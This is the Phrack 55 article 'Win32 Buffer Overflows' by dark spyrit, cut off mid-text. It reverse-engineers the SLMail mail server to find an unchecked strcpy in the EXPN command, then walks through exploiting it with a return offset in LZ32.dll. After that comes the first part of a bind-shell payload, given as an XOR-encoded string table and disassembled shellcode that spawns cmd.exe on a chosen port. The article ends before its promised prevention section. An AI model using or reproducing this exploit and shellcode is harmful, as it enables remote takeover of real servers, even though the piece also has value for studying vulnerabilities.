@@ -1,0 +1,2193 @@
+-------[  Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 15 of 19  ]
+
+   
+-------------------------[  Win32 Buffer Overflows
+                            (Location, Exploitation and Prevention)
+
+
+--------[ dark spyrit AKA Barnaby Jack <dspyrit@beavuh.org>  ]
+
+
+----[  Abstract
+
+"If you assume that there's no hope, you guarantee there will be no hope.
+If you assume that there is an instinct for freedom, there are
+opportunities to change things."
+
+-Noam Chomsky
+
+
+The Internet - the last great stronghold of freedom of thought, ideas and
+expression - and with each passing moment the bleak outcome of a corporate
+and government controlled entity increases in probability.
+
+The battle lines have been drawn, and for the moment, we have the upper
+hand, but only by a margin.
+
+Software companies with no alternative but to resort to the censorship of
+knowledge have made their presence felt, sites relating to the 'black art'
+of software reversing and the like are being removed on a continual basis.
+
+Hopefully, the few unrestrained who walk the back alleys will continue to
+publish information - and create avenues for others to expand, spread and
+develop - this is where the battle will be won.
+
+Assembly language is a weapon chosen only by few, but those who possess
+the skill to harness its power can and will defeat any of the newer tools
+of modern combat.
+
+I wish you the best of luck finding information, though.  With power, comes a
+price - Assembler isn't the easiest language to learn, and as such you may
+have trouble finding documentation among the hordes of Visual this, Visual
+that, Visual Bloat for Dummies.. but continue your search, you'll be glad
+you did.
+
+When profit gain is the primary momentum, speed, control, size and performance
+of your software is sacrificed for ease of use and 'prompt development'.
+The need to know what goes on internally is a rare necessity and optimization
+is of little importance.  Those that remain untainted by the prospect of
+monetary rewards, and first and foremost are driven by the sheer desire to
+better educate ones self, are those that will always be on the pinnacle -
+and are those that are feared most of all.
+
+With Windows NT now a major player, and the open source movement not looking
+to have any impact in the near future, the ability to 'look under the hood' is
+an incredibly valuable asset and will be the focus of the first section in
+this paper.
+
+It is of no great surprise that attempts to outlaw reverse engineering are
+currently in the works, but the effects of such a proposal would be disastrous. 
+
+Despite the fact that it is an open invitation for vendors to use sub-standard
+coding practice, there are those in the security industry who rely on these
+techniques to find and document vulnerabilities.  The online world would
+suffer as a result.
+
+Do not concede.
+
+
+Introduction.
+~~~~~~~~~~~~~
+
+This paper will be separated into 3 sections.
+
+The first will cover a standard reversing session, and we'll point out a
+common vulnerability.
+
+The second will demonstrate the process of exploiting the weakness - the
+problem with most win32 remote overflow exploits stems from the payload,
+the current trend is to have the shellcode download an external file and
+execute.
+
+Far too many problems result from this technique, depending on
+router/firewall configurations etc.
+
+The payload I present to you will directly spawn a full-blown shell on any
+port you specify, eliminating 90% of most reported problems.  This is the
+first of its kind as far as I am aware.
+
+The last section will show how to add your own code to the executables
+of your target to prevent exploitation.
+
+
+The example I will be using for this document is the latest version of
+Seattle Labs mail server (3.2.3113).  There are numerous buffer overflows
+riddled throughout this software, we'll be concentrating on a port opened by
+the POP service, which provides the Extended Turn functions.
+
+Seattle Labs were contacted about this in a previous version but did not
+bother to remedy the situation, instead they just changed the default port
+from 27 to 8376.
+
+Bad move.
+
+The vulnerabilities were made public by the way, so please, Russ, don't send
+me nasty emails.
+
+Before we begin I will assume you have a general knowledge of Assembler,
+Windows programming, a basic understanding of the Portable Executable
+structure and you know the fundamentals of buffer overflows - I won't be
+re-hashing the basics in this paper.
+
+
+Tools Required:
+
+Interactive Disassembler from http://www.datarescue.com - hands down the BEST 
+disassembler for the PC.
+
+A decent debugger, e.g.: SoftIce.
+
+PE Dump from Matt Peitrek, or dumpbin will suffice.
+
+A hex editor, any will do.. PS Edit does nicely.
+
+A Win32 API reference.
+
+If you want to assemble the tools/exploits that accompany this paper then
+you'll also need TASM 5.0.
+
+The binaries will be available at http://www.beavuh.org as well as the 
+latest goodies that we feel the need to release.
+
+
+Section 1: Under the Hood.  
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Interactive Disassembler Pro is without a doubt, THE tool for reversing code.
+Disassembly begins from the entry point of the program, and follows all routes
+of execution, then continues to locate functions outside of the main flow of
+the program.  You have full control over what is marked as data or code.  IDA
+recognizes a huge amount of library functions, which provides a much better
+understanding of the target.  It will disassemble an unbelievable amount of
+file formats, from a wide range of processors.  You're given the ability to
+have repeatable comments, labels, modify any piece of code, function,
+"interactively".  IDA also includes it's own macro language, to automate
+your chores.
+
+If I were to cover everything this tool can do I would be here all day, and
+I'd still be missing something.
+
+With the combined effort of IDA and Soft Ice, there are no barriers.
+
+This section will be rather short, the only reason being that IDA cuts through
+SLMail's code like a machete.
+
+Load up slmail.exe into IDA and we'll get underway...
+
+
+First we need to think about our target for a minute, we're going to try and
+exploit one of the SMTP commands so it is almost certain they will be accessed
+and compared from a table.. Let's do a search:
+
+Hit <alt+b> "search for text in core" and enter "EXPN", we'll land smack in
+the middle of these ASCII strings.
+
+
+004439C0 aSize           db 'SIZE',0
+004439C5                 align 4
+004439C8 aXtrn           db 'XTRN',0
+004439CD                 align 4
+004439D0 aEtrn           db 'ETRN',0
+004439D5                 align 4
+004439D8 aQuit           db 'QUIT',0             ; DATA XREF: sub_403970+280o
+004439D8                                         ; .data:00448A60o
+004439DD                 align 4
+004439E0 aHelp_0         db 'HELP',0
+004439E5                 align 4
+004439E8 aTurn           db 'TURN',0             ; DATA XREF: sub_403970+F0o
+004439ED                 align 4
+004439F0 aExpn           db 'EXPN',0    
+
+...<snip>
+
+
+Now we need to find the table that references the commands, so we'll do
+another search.. this time entering the dword offset to the left of EXPN
+(004439f0).
+
+And we land in the middle of this mess:
+
+
+004436F8 dword_4436F8    dd 443A98h              ; DATA XREF: sub_404390+24r
+004436F8                                         ; sub_404390+34o
+004436FC                 db    3 ;  
+004436FD                 db    0 ;  
+004436FE                 db    0 ;  
+004436FF                 db    0 ;  
+00443700                 db  94h ; "
+00443701                 db  3Ah ; :
+00443702                 db  44h ; D
+00443703                 db    0 ;  
+00443704                 db  0Ah ;  
+00443705                 db    0 ;  
+00443706                 db    0 ;  
+00443707                 db    0 ;  
+00443708                 db  90h ; ê
+00443709                 db  3Ah ; :
+0044370A                 db  44h ; D
+0044370B                 db    0 ;  
+0044370C                 db    1 ;  
+0044370D                 db    0 ;  
+0044370E                 db    0 ;  
+0044370F                 db    0 ;  
+
+...<snip>
+
+004437E8                 db 0F0h ; 
+004437E9                 db  39h ; 9
+004437EA                 db  44h ; D
+004437EB                 db    0 ;  
+004437EC                 db  19h ;  
+004437ED                 db    0 ;  
+004437EE                 db    0 ;  
+004437EF                 db    0 ;  
+
+
+There's no point showing the complete table here, now.. take a look at its
+structure.
+
+
+<pointer to string> <dword> <pointer to string> <dword> etc
+
+
+My best guess here is that the dword value following each pointer will be the
+value assigned after a successful comparison. Let's check our theory.  Also we
+should note down our value after the pointer to "EXPN" : 004439f0h, 00000019h. 
+
+0x19, we'll keep that in mind.
+
+Scroll up and at the top of the table you see:
+
+
+004436F8 dword_4436F8    dd 443A98h              ; DATA XREF: sub_404390+24r
+004436F8                                         ; sub_404390+34o
+
+
+You can see to the right where the table is referenced, so click on the
+subroutine and we'll land straight into the call.
+
+
+004043B4 loc_4043B4:                             ; CODE XREF: sub_404390+11j
+004043B4                 mov     ecx, dword_4436F8
+004043BA                 test    ecx, ecx
+004043BC                 jz      short loc_4043F3 
+004043BE                 mov     ebp, ds:lstrlenA
+004043C4                 mov     esi, offset dword_4436F8
+
+
+Our table loaded at esi, ebp contains the address of lstrlenA.
+
+
+004043C9 
+004043C9 loc_4043C9:                             ; CODE XREF: sub_404390+61j
+004043C9                 test    eax, eax
+004043CB                 jnz     short loc_4043F3
+004043CD                 mov     eax, [esi]
+004043CF                 push    eax
+004043D0                 call    ebp
+
+
+Here we go, the string first moved to eax and then a string length function
+called.
+
+
+004043D2                 mov     ecx, [esi]
+004043D4                 push    eax
+004043D5                 push    ecx
+004043D6                 push    ebx
+004043D7                 call    j_lstrncmpi
+004043DC                 neg     eax
+004043DE                 sbb     eax, eax
+004043E0                 inc     eax
+004043E1                 jz      short loc_4043E9
+
+
+Now we know that the parameters for lstrncmpi are as follows:
+
+strncmpi(first_string, second_string, number_of_chars);
+
+The first parameter pushed on the stack is the return from the string length
+function, ecx is then pushed which points to the string, and finally ebx.
+So we can determine from this that ebx contains the input from the user.
+I can see that some of you may be a little puzzled here, yes - parameters
+are pushed on to the stack in reverse order.
+
+
+004043E3                 xor     edi, edi
+004043E5                 mov     di, [esi+4]
+
+
+Ah, just as we suspected.. if there is a successful comparison then di is
+loaded with the value that followed our pointer.
+
+
+004043E9 
+004043E9 loc_4043E9:                             ; CODE XREF: sub_404390+51j
+004043E9                 mov     ecx, [esi+8]
+004043EC                 add     esi, 8
+004043EF                 test    ecx, ecx
+004043F1                 jnz     short loc_4043C9
+
+loop :)
+
+004043F3 
+004043F3 loc_4043F3:                             ; CODE XREF: sub_404390+18j
+004043F3                                         ; sub_404390+2Cj ...
+004043F3                 mov     eax, edi       
+004043F5                 pop     edi
+004043F6                 pop     esi
+004043F7                 pop     ebp
+004043F8                 pop     ebx
+004043F9                 retn    
+004043F9 sub_404390      endp ; sp = -10h
+004043F9 
+
+
+And finally eax holds our value, and we return from the call.  Let's continue.
+
+
+00405EC7                 mov     edx, [esp+2Ch+arg_8]
+00405ECB                 mov     ebx, eax
+00405ECD                 mov     eax, [esp+2Ch+arg_4]
+00405ED1                 push    edx
+00405ED2                 push    eax
+00405ED3                 push    esi
+00405ED4                 lea     ecx, [esp+3Ch]
+00405ED8                 push    edi
+00405ED9                 push    ecx
+00405EDA                 push    ebx
+00405EDB                 call    sub_404850
+
+
+Now, the important things to take note of here is edx gets our inputted
+string, and ebx is given our value from the table (0x19).  Remember the
+order in which our registers were pushed, so we will be able to tell what
+is being referenced from the stack - and in the next call we will rename
+the stack variables to make it easier on ourselves.
+
+Note: I'm not taking advantage of some of the GREAT features IDA possesses
+- repeatable comments, labels and much more.  A necessity while on a real
+reversing journey.
+
+
+00404850 sub_404850      proc near               ; CODE XREF: sub_405330+73p
+00404850                                         ; sub_405560+73p ...
+00404850 
+00404850 var_270         = byte ptr -270h
+00404850 var_26C         = dword ptr -26Ch
+00404850 var_268         = byte ptr -268h
+00404850 var_264         = byte ptr -264h
+00404850 var_23C         = byte ptr -23Ch
+00404850 var_230         = byte ptr -230h
+00404850 var_168         = byte ptr -168h
+00404850 var_110         = byte ptr -110h
+00404850 var_105         = byte ptr -105h
+00404850 var_104         = byte ptr -104h
+00404850 var_10          = dword ptr -10h
+00404850 var_4           = dword ptr -4
+00404850 our_val         = dword ptr  4
+00404850 arg_4           = dword ptr  8
+00404850 arg_8           = dword ptr  0Ch
+00404850 arg_C           = dword ptr  10h
+00404850 arg_10          = dword ptr  14h
+00404850 our_input       = dword ptr  18h
+00404850 
+00404850                 mov     ecx, [esp+our_val]
+00404854                 sub     esp, 26Ch
+0040485A                 xor     eax, eax
+0040485C                 cmp     ecx, 8
+0040485F                 push    ebx
+00404860                 push    ebp
+00404861                 push    esi
+00404862                 push    edi
+00404863                 jnz     loc_4048E9
+
+
+We rename the useful stack arguments to something easier to remember,
+arg_0 = our_val, and arg_14 = our_input - if you're lost go back and take
+another look at the order the registers were pushed.
+
+ecx is loaded with our 0x19 value.  It is then compared to 8, which is not
+us, so we'll follow the jump.
+
+
+004048E9 
+004048E9 loc_4048E9:                             ; CODE XREF: sub_404850+13j
+004048E9                 cmp     ecx, 17h
+004048EC                 jnz     short loc_40495A
+004048EE                 mov     ecx, [esp+27Ch+arg_10]
+004048F5                 mov     esi, [esp+27Ch+arg_C]
+004048FC                 mov     eax, [ecx]
+004048FE                 cmp     eax, 8
+00404901                 jnz     short loc_404914
+00404903                 mov     ecx, [esi+100h]
+00404909                 test    ecx, ecx
+0040490B                 jz      short loc_404914
+0040490D                 mov     ebx, 1
+00404912                 jmp     short loc_404916
+
+
+A comparison to 17h, again.. not us, so we continue to follow the jumps until
+we reach...
+
+
+00404B7F loc_404B7F:                             ; CODE XREF: sub_404850+1C0j
+00404B7F                 cmp     ecx, 19h
+00404B82                 jnz     loc_404D7F
+00404B88                 mov     eax, dword_457354
+00404B8D                 test    eax, eax
+00404B8F                 jz      loc_404D4F
+00404B95                 mov     eax, dword_457384
+00404B9A                 mov     edi, [esp+27Ch+our_input]
+00404BA1                 push    0
+00404BA3                 push    eax
+00404BA4                 push    edi
+00404BA5                 call    sub_4365A0
+
+
+And here's our boy, note how our variables we renamed follow all through
+the call, IDA rocks doesn't it? :)
+
+So edi gets our string input, and we follow yet another call - again we'll
+rename the useful stack variable upon entering the next call.
+i.e.: edi = arg_0 = our_input
+
+
+004365A0 sub_4365A0      proc near               ; CODE XREF: sub_4029D0+92p
+004365A0                                         ; sub_4029D0+107p ...
+004365A0 
+004365A0 var_12C         = byte ptr -12Ch
+004365A0 var_12B         = byte ptr -12Bh
+004365A0 our_input       = dword ptr  4
+004365A0 arg_4           = dword ptr  8
+004365A0 arg_8           = dword ptr  0Ch
+004365A0 
+004365A0                 mov     eax, [esp+arg_8]
+004365A4                 mov     ecx, [esp+arg_4]
+004365A8                 sub     esp, 12Ch
+004365AE                 lea     edx, [esp+12Ch+var_12C]
+004365B2                 push    0
+004365B4                 push    eax
+004365B5                 mov     eax, [esp+134h+our_input]
+004365BC                 push    ecx
+004365BD                 push    12Ch
+004365C2                 push    edx
+004365C3                 push    eax
+004365C4                 call    sub_4364A0
+
+
+And yet another call, again take notice of the order in which the registers
+were pushed, eax=arg_0=our_input.  I have a feeling we are getting closer
+to the goods.
+
+Ok, I admit it. I peeked.
+
+
+004364A0 sub_4364A0      proc near               ; CODE XREF: sub_436470+1Bp
+004364A0                                         ; sub_4365A0+24p ...
+004364A0 
+004364A0 var_98          = byte ptr -98h
+004364A0 var_8C          = byte ptr -8Ch
+004364A0 var_78          = byte ptr -78h
+004364A0 var_6C          = byte ptr -6Ch
+004364A0 var_35          = byte ptr -35h
+004364A0 var_15          = byte ptr -15h
+004364A0 var_8           = dword ptr -8
+004364A0 var_4           = dword ptr -4
+004364A0 our_input       = dword ptr  4
+004364A0 arg_4           = dword ptr  8
+004364A0 
+004364A0                 mov     eax, [esp+our_input]
+004364A4                 sub     esp, 64h
+004364A7                 push    ebx
+004364A8                 push    ebp
+004364A9                 push    esi
+004364AA                 mov     esi, [esp+70h+arg_4]
+004364AE                 push    edi
+004364AF                 push    eax
+004364B0                 push    esi
+004364B1                 call    ds:lstrcpyA
+004364B7                 push    40h
+004364B9                 push    esi
+004364BA                 call    j_lstrchr
+004364BF                 test    eax, eax
+004364C1                 jz      short loc_4364C6
+004364C3                 mov     byte ptr [eax], 0
+
+
+And here we have it, the classic screw-up.  esi points to the buffer, eax
+has our string - *bang* strcpy.
+
+Did anyone out there notice any form of bounds checking up to this point?
+I sure didn't.
+
+Please guys, do not try to hide from us - we CAN see what you do.
+
+Now we know EXPN is our sure-fire victim.  Feel free to follow some of the
+other commands, you will run into similar coding practice, Seattle Labs
+have a lot to clean up.
+
+From a relatively quick reversing session, we find a common mistake - yet
+a mistake that compromises the entire server.
+
+Now, obviously, a lot of sessions won't be as straight forward - wait for
+a rainy day, have an extra packet of cigarettes on hand, a bottle of vodka,
+crank some 30footFALL and get hacking - patience is a virtue, take your time
+and navigate the code, you'll be amazed at what you find.
+
+And hey, even if you come up empty, by the time you've downed that bottle you
+won't care anyway.
+
+With enough patience and determination, you will find a barrage of different
+holes and vulnerabilities through disassembly techniques.  It is an asset
+worth having.
+
+
+Section 2: The Exploit.
+~~~~~~~~~~~~~~~~~~~~~~~
+
+Although this section will cover some tricks, techniques and the process
+of exploiting overflows in Windows, the main purpose of this section is to
+document what I consider the most ideal shellcode available for Win32
+exploits at this time.
+
+The last thing I want to do is go over already covered ground - none the
+less, I will document the route I took personally before creating the
+payload.  To those of you who have done this sort of thing before, feel
+free to skip straight to the shellcode.
+
+Before we begin, I just have something to say quickly regarding some members
+of the security community.
+
+When I released the IIS exploit (the definition of proof of concept :)),
+some of the mail was rather unsettling.
+
+Mail from employees of large corporations and yes, government agencies,
+bearing titles such as 'Head of Network Security' and similar who were
+using the exploit to determine the risk to their servers.  If the exploit
+failed, some were prepared to class the risk as minimal.
+
+Do not determine the threat to your servers solely on the results of one
+public exploit - the vulnerability exists, fix it.  If you think that was
+the only demonstration code floating around you need your head examined.
+
+Hopefully now, you may change your attitude.  The masses now have full
+control, without fail.
+
+Here we go.
+
+My experience with NT is rather limited, in fact, I've only recently made
+the move from spelunking Windows 9x.
+
+Unfortunately what I've noticed under NT is SoftIce has a bit of trouble
+trapping faults, and other debuggers tend to break in after the exception
+handling has kicked in.
+
+This sucks for a couple of reasons.
+
+If an exception is raised after a string length routine tries to read from
+invalid memory for example, under NT its quite likely that it'll be the
+exception handler itself that overwrites eip with your data (IIS comes to
+mind again).
+
+We can route our eip to an offset at that point if we wish, but it isn't
+particularly delicate, we'd be much better off to try and throw in some
+valid addresses and let the code ret to an eip with our data.
+
+What I suggest is setting a breakpoint on the exception dispatcher and
+dumping the eip it was called from.. 
+
+e.g.: bpx KiUserExceptionDispatcher DO "dd *esp+0c"
+
+Now if eip hasn't been overwritten you can break at that offset and see
+what you have to play with, if eip has been taken then the offset at that 
+location should be your bytes.
+
+In that case you can either try and trace back into the blown stack and
+find a location to break on relatively close to where we ret to our eip,
+or just take an educated guess.
+
+The latter is the path we'll take.
+
+Let's break this thing.
+
+attica:~> telnet 192.168.10.3 8376
+Trying 192.168.10.3...
+Connected to 192.168.10.3.
+Escape character is '^]'.
+220 supermax.gen.nz Smtp Server SLMail v3.2 Ready ESMTP spoken here
+expn xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+Our debugger breaks in, obviously in this case eip has been totally
+taken, look at where the handler was called - 0x78787878, i.e.: xxxx.
+
+Ok, now we want to find the exact point in the code where we return to our
+address - let's take a look at the disassembly.
+
+
+004364AF                 push    eax
+004364B0                 push    esi
+004364B1                 call    ds:lstrcpyA
+
+
+Let's set a breakpoint just above the call to lstrcpy, that way we can also
+have a closer look at the buffer manipulation and we should be mere footsteps
+away from total system control.
+
+Ok, send the data and let your debugger kick in, ret out of the call and
+you'll quickly reach..
+
+
+or	eax, -01
+add	esp, 0000012c
+ret
+
+
+That's where we wanna be, that ret will drop us to our eip.  We have control.
+
+Now, to go somewhere useful.
+
+Let's examine the registers and see what we have to play with, esp is totaled
+and points somewhere around the middle of our buffer.  So we could jump the
+stack, but why bother?  Take a look at some of those other registers - edi
+has our buffer directly after the "expn".  We couldn't have asked for
+anything better.  Although there are a fair few different ways to jump the
+stack, we'll almost always find a "call edi" or similar.
+
+Let's think about this for a moment, in a perfect world we'd just reference
+an offset in slmail.exe - but this is the world of Windows.
+
+We have to avoid null bytes so unfortunately we can't use the exe itself, as
+it is loaded at the default base address of 0x00400000.  We could use a
+location in the executable if we were to place our offset at the end of our
+data, as we'd have the null at the end of the string, but that doesn't leave
+us with enough space for a decent payload.  Remember we don't want this to be
+dependent on the version of NT at all, so we either need to use a DLL included
+with SLMail or an external DLL that is static on all service packs.
+
+So let's take a look at what else has been loaded from that process.
+SysInternals (http://www.sysinternals.com) have a handy little util called
+listdlls which will show you just that.
+
+
+C:\tools>listdlls slmail.exe
+
+ListDLLs V2.1
+Copyright (C) 1997-1999 Mark Russinovich
+http://www.sysinternals.com
+
+------------------------------------------------------------------------------
+slmail.exe pid: 159
+  Base        Size      Version         Path
+  0x00400000  0x62000   3.02.0001.1204  E:\PROGRA~1\SLmail\slmail.exe
+  0x77f60000  0x5c000   4.00.1381.0130  E:\WINNT\System32\ntdll.dll
+  0x10000000  0xc000    2.03.0000.0000  E:\WINNT\system32\OpenC32.dll
+  0x77f00000  0x5e000   4.00.1381.0133  E:\WINNT\system32\KERNEL32.dll
+  0x77ed0000  0x2c000   4.00.1381.0115  E:\WINNT\system32\GDI32.dll
+  0x77e70000  0x54000   4.00.1381.0133  E:\WINNT\system32\USER32.dll
+  0x77dc0000  0x3f000   4.00.1381.0121  E:\WINNT\system32\ADVAPI32.dll
+  0x77e10000  0x57000   4.00.1381.0131  E:\WINNT\system32\RPCRT4.dll
+  0x77d80000  0x32000   4.00.1381.0027  E:\WINNT\system32\comdlg32.dll
+  0x77c40000  0x13c000  4.00.1381.0114  E:\WINNT\system32\SHELL32.dll
+  0x77aa0000  0x74000   4.72.3609.2200  E:\WINNT\system32\COMCTL32.dll
+  0x776d0000  0x8000    4.00.1381.0131  E:\WINNT\system32\WSOCK32.dll
+  0x776b0000  0x14000   4.00.1381.0133  E:\WINNT\system32\WS2_32.dll
+  0x78000000  0x40000   6.00.8337.0000  E:\WINNT\system32\MSVCRT.dll
+  0x776a0000  0x7000    4.00.1381.0031  E:\WINNT\system32\WS2HELP.dll
+  0x77a90000  0xb000    4.00.1371.0001  E:\WINNT\system32\VERSION.dll
+  0x779c0000  0x8000    4.00.1371.0001  E:\WINNT\system32\LZ32.dll
+  0x77bf0000  0x7000    4.00.1381.0072  E:\WINNT\system32\rpcltc1.dll
+  0x77660000  0xf000    4.00.1381.0037  E:\WINNT\system32\msafd.dll
+  0x77690000  0x9000    4.00.1381.0037  E:\WINNT\System32\wshtcpip.dll
+  0x74ff0000  0xd000    4.00.1381.0131  E:\WINNT\System32\rnr20.dll
+
+
+There's not much loaded there in the way of its own DLL's, so we'll have to
+pick something external.  LZ32.DLL will do, static on all service packs,
+has the code we need and the offset has no null bytes.
+ 
+We find at location 0x779C1CAA we have a "call edi", that'll do nicely.
+
+The next problem - we need to know where in our buffer to stuff our offset.
+A quick and easy way to find this out is to fill your buffer with a heap
+of independent bytes, 1A, 2A, 3A, 4A....A1, A2 and so on, and you'll be
+able to pinpoint the location when eip is overwritten.
+
+Quickly we notice that the location we need is about 300 bytes into our buffer,
+so we have:
+
+expn <299 nops> 0x779c1caa
+
+So in its current form, if we were to send that data, eip would return to the
+offset 0x779c1caa which would call edi and execute our nops - before the offset
+we will also add in a short jump to bypass the garbage instructions that our
+offset was translated to.
+
+Now all that remains is to tack our payload on to the end.
+
+It's time. 
+
+
+The Payload.
+~~~~~~~~~~~~
+
+Note: the ideas for the string table/jump table came from DilDog, very cool.
+Amazing work you do.
+
+The goal:
+
+An exploit that spawns a command prompt directly on a specified port, and will
+execute successfully on all NT versions. 
+
+Considerations:
+
+- We are unsure of the exact OS version.
+- Function locations will differ depending on versions/service packs/upgrades.
+- The import table for SLMail does not have all needed functions.
+- We must avoid null bytes, carriage returns etc.
+
+We can take care of the first three problems by linking to the IAT of slmail,
+and using those procedures to load external functions.  As for the fourth?
+We'll just have to be clever.
+
+In order for me to keep the shellcode as generic as possible, we will create a
+jump table of all external functions we will be using, without relying on
+SLMails imports - with two exceptions.
+
+For us to be able to load DLL's and retrieve the addresses for needed
+procedures we will need to reference two functions from the import table
+of slmail.exe:
+
+GetProcAddress and LoadLibraryA.
+
+Before I show the table we create, I want to give a brief rundown on what's
+involved when spawning a remote shell under Windows NT.  Unfortunately it
+is not anywhere near as straight forward as when you're working with *nix,
+but, of course, it's do-able.  To be able to spawn a full-blown remote
+shell, we need to be able to redirect standard output and standard error
+to the connected user, and the connected user must have control over
+standard input.
+
+The answer?
+
+Anonymous Pipes.
+
+The primary use for anonymous pipes is to exchange data between
+parent/child processes, or just between child processes.
+
+The anonymous pipe is a one-way pipe - the data will flow in one
+direction - from one end, to the other.  The usefulness is apparent when
+we are working with the console, as we can replace the handles of
+stdin/stdout/stderr with handles to the ends of the created pipes.  We can
+then read and write to the pipes with the Read and Writefile API's.  From
+the read end of the stdout pipe, we send the buffer to the connected socket
+and subsequently what we receive from the connected socket we fire off to
+the write end of the stdin pipe.
+
+To keep it generic our string table is unfortunately going to have to include
+a fair few functions, all taking up precious bytes.  When you are strapped
+for stack space you'll want to make use of more functions from your targets
+IAT.
+
+
+The table:
+
+        db "KERNEL32",0	;string to push for LoadLibrary.
+	db "CreatePipe",0
+	db "GetStartupInfoA",0  
+
+;we will modify the start-up structure at runtime as the structure is far
+;too large to include in the shellcode.
+	
+	db "CreateProcessA",0
+	db "PeekNamedPipe",0
+	db "GlobalAlloc",0
+	db "WriteFile",0
+	db "ReadFile",0
+	db "Sleep",0
+	db "ExitProcess",0
+	
+	db "WSOCK32",0
+	db "socket",0
+	db "bind",0
+	db "listen",0
+	db "accept",0
+	db "send",0
+	db "recv",0
+
+sockstruc STRUCT
+	sin_family dw 0002h
+	sin_port   dw ?
+	sin_addr   dd ?
+	sin_zero   db 8 dup (0)
+sockstruc ENDS
+
+;the sin_port word value will be filled by the exploit client before the
+;shellcode is sent.	
+	
+	db "cmd.exe",0
+	dd 0ffffffffh
+	db 00dh, 00ah
+
+;the string to push to invoke the command prompt. 
+;the dword at the end will be used to reference the end of the string table 
+;at runtime.
+
+
+Now, I know what you're thinking - all those strings are null-terminated,
+and the structures contain null bytes.  To get around this, we will XOR
+the string table with 0x99, except for the carriage, linefeed, and the
+0xFFFFFFFF dword.
+
+If all went to plan, your encrypted table should look a little something
+like this:
+
+
+00000280  .. .. .. .. .. .. .. .. .. .. .. D2 DC CB D7 DC              .....
+00000290  D5 AA AB 99 DA EB FC F8-ED FC C9 F0 E9 FC 99 DE   ................
+000002A0  FC ED CA ED F8 EB ED EC-E9 D0 F7 FF F6 D8 99 DA   ................
+000002B0  EB FC F8 ED FC C9 EB F6-FA FC EA EA D8 99 DA F5   ................
+000002C0  F6 EA FC D1 F8 F7 FD F5-FC 99 C9 FC FC F2 D7 F8   ................
+000002D0  F4 FC FD C9 F0 E9 FC 99-DE F5 F6 FB F8 F5 D8 F5   ................
+000002E0  F5 F6 FA 99 CE EB F0 ED-FC DF F0 F5 FC 99 CB FC   ................
+000002F0  F8 FD DF F0 F5 FC 99 CA-F5 FC FC E9 99 DC E1 F0   ................
+00000300  ED C9 EB F6 FA FC EA EA-99 CE CA D6 DA D2 AA AB   ................
+00000310  99 EA F6 FA F2 FC ED 99-FB F0 F7 FD 99 F5 F0 EA   ................
+00000320  ED FC F7 99 F8 FA FA FC-E9 ED 99 EA FC F7 FD 99   ................
+00000330  EB FC FA EF 99 9B 99 82-A1 99 99 99 99 99 99 99   ................
+00000340  99 99 99 99 99 FA F4 FD-B7 FC E1 FC 99 FF FF FF   ................
+00000350  FF 0D 0A                                          ...
+
+
+This will be tacked on to the very end of our shellcode.
+
+Now it is time to get to the good stuff.
+
+Note: this exploit assumes a base address of 0x00400000
+
+The recommended way to follow this is to step over the code in your
+debugger while reading the explanations.
+
+
+:00000138 33C0                    xor eax, eax
+:0000013A 50                      push eax
+:0000013B F7D0                    not eax
+:0000013D 50                      push eax
+:0000013E 59                      pop ecx
+:0000013F F2                      repnz
+:00000140 AF                      scasd
+:00000141 59                      pop ecx
+:00000142 B1C6                    mov cl, C6
+:00000144 8BC7                    mov eax, edi
+:00000146 48                      dec eax
+:00000147 803099                  xor byte ptr [eax], 99
+:0000014A E2FA                    loop 00000146
+
+
+This sets edi to the end of our encrypted string table by scanning the buffer
+for our dword (0xFFFFFFFF), ecx holds the amount of characters to decrypt.
+edi is then moved to eax, and each byte is decrypted (XORed with 0x99).  eax
+now points to the beginning of the string table.
+
+
+:0000014C 33F6                    xor esi, esi
+:0000014E 96                      xchg eax,esi
+:0000014F BB99101144              mov ebx, 44111099
+:00000154 C1EB08                  shr ebx, 08
+:00000157 56                      push esi
+:00000158 FF13                    call dword ptr [ebx]
+
+
+Here we make a call to LoadLibraryA, pushing esi as the parameter - which
+points to "KERNEL32", the first string of the table.  The call is made by
+giving ebx the location of LoadLibrary from SLMails import table, and we
+tack on an extra byte to avoid the use of a null character.  We then kill
+it by shifting the value right one byte.  LoadLibraryA = 00441110h
+
+
+:0000015A 8BD0                    mov edx, eax
+:0000015C FC                      cld
+:0000015D 33C9                    xor ecx, ecx
+:0000015F B10B                    mov cl, 0B
+:00000161 49                      dec ecx
+:00000162 32C0                    xor al, al
+:00000164 AC                      lodsb
+:00000165 84C0                    test al, al
+:00000167 75F9                    jne 00000162
+
+
+We give ecx the amount of procedures we have specified from the kernel, as
+we will be creating a jump table for our functions.  Then we just increment
+esi until we reach a null byte - moving to the next string name.
+
+
+:00000169 52                      push edx
+:0000016A 51                      push ecx
+:0000016B 56                      push esi
+:0000016C 52                      push edx
+:0000016D B30C                    mov bl, 0C
+:0000016F FF13                    call dword ptr [ebx]
+:00000171 AB                      stosd
+:00000172 59                      pop ecx
+:00000173 5A                      pop edx
+:00000174 E2EC                    loop 00000162
+
+
+Here we call GetProcAddress, ebx already had the value from LoadLibrary, so we
+only need to modify the low byte.  We then store the address at edi, and loop
+for the rest of the functions.  We now have a jump table at edi - we can now
+call each function indirectly from edi.  e.g.: call dword ptr [edi-0c].
+ 
+
+:00000176 32C0                    xor al, al
+:00000178 AC                      lodsb
+:00000179 84C0                    test al, al
